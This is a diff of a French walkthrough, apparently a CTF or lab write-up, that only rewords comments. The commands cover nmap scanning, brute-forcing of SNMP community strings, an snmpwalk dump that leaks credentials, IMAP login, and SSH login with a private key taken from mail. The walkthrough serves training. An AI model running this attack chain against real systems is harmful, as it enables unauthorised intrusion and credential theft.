@@ -20,12 +20,12 @@ La démarche se décompose en quatre phases :
 ### Phase 1 : Enumération
 
 ```bash
-# depuis Exegol - scan TCP complet
+# depuis votre machine d'attaque - scan TCP complet
 sudo nmap -sV -p- <IP_CIBLE> -Pn -n
 ```
 
 ```bash
-# depuis Exegol - scan UDP ciblé
+# depuis votre machine d'attaque - scan UDP ciblé
 sudo nmap -sU -F -sV <IP_CIBLE>
 ```
 
@@ -34,14 +34,14 @@ Le scan TCP révèle les services de messagerie (IMAP/POP3 sur les ports 110, 14
 ### Phase 2 : SNMP
 
 ```bash
-# depuis Exegol - brute-force des community strings
+# depuis votre machine d'attaque - brute-force des community strings
 onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP_CIBLE>
 ```
 
 La community string par défaut (`public`) ne retourne rien. Le brute-force fait apparaitre une community custom.
 
 ```bash
-# depuis Exegol - dump complet des OID SNMP
+# depuis votre machine d'attaque - dump complet des OID SNMP
 snmpwalk -v2c -c <community> <IP_CIBLE>
 ```
 
@@ -54,7 +54,7 @@ Les OID SNMP sous `hrSWRunParameters` (1.3.6.1.2.1.25.4.2) exposent les argument
 Avec les credentials récupérés via SNMP, se connecter au serveur IMAP :
 
 ```bash
-# depuis Exegol - connexion IMAP sécurisée
+# depuis votre machine d'attaque - connexion IMAP sécurisée
 openssl s_client -connect <IP_CIBLE>:993
 ```
 
@@ -72,7 +72,7 @@ Explorer tous les dossiers (pas seulement INBOX). Les mails internes contiennent
 Si une clé SSH privée est trouvée dans un mail :
 
 ```bash
-# depuis Exegol - préparer la clé et se connecter
+# depuis votre machine d'attaque - préparer la clé et se connecter
 chmod 600 id_rsa
 ssh -i id_rsa user@<IP_CIBLE>
 ```
